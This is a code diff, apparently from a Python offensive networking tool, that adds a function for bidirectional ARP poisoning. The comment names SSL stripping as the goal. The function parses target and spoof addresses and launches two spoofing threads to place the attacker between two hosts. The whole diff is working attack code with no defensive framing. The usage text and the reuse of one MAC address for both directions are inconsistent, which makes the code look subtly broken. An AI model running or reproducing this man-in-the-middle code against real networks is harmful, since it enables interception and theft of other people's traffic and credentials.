@@ -35,6 +35,29 @@ def start_arp_poison(cmd):
     arp_thread.daemon = True
     arp_thread.start()
 
+# ARP poisoning for SSL stripping
+def start_arp_poison_ssl(cmd):
+    args = shlex.split(cmd)
+    ip = mac = iptospoof = None
+    for i, arg in enumerate(args):
+        if arg == "-tgtip" and i + 1 < len(args):
+            ip = args[i + 1]
+        elif arg == "-spmac" and i + 1 < len(args):
+            mac = args[i + 1]
+        elif arg == "-spip" and i + 1 < len(args):
+            iptospoof = args[i + 1]
+    if not ip or not mac or not iptospoof:
+        print("[!] Usage: arp_poison -tgtip <target_ip> -spmac <target_mac> -spip <spoofed_ip>")
+        return
+    print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, iptospoof))
+
+    arp_thread = threading.Thread(target=arp_spoof_loop, args=(ip, mac, iptospoof))
+    arp_thread.daemon = True
+    arp_thread.start()
+
+    arp_thread = threading.Thread(target=arp_spoof_loop, args=(iptospoof, mac, ip))
+    arp_thread.daemon = True
+    arp_thread.start()
 
 # Starts a thread that performs ARP spoofing sending a limited number of packets.
 def start_arp_thread(target_ip, mac, spoofed_ip, count):
